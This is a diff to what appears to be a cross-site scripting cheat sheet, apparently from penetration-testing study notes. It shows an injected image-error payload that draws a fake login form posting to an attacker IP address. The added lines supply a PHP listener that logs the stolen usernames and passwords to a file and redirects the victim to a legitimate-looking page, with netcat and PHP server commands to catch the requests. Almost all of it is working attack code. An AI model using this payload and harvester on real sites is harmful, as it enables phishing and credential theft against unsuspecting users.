@@ -152,7 +152,17 @@ document.getElementsByTagName('body')[0].innerHTML = "New Text" // Change the wh
 // Login Form Injection & Credentail Stealing
 <img src="" onerror=document.write('<h3>Please login to continue</h3><form action=http://10.10.14.82:8080><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form><img src="" onerror=document.getElementById('urlform').remove();> <!--
 
-sudo nc -lnvp 8080
+sudo nc -lnvp 8080 // Catch with nc
+<?php // Catch with PHP script to forward victim to legit site:
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+sudo php -S 0.0.0.0:8080
 ```
 
 ---
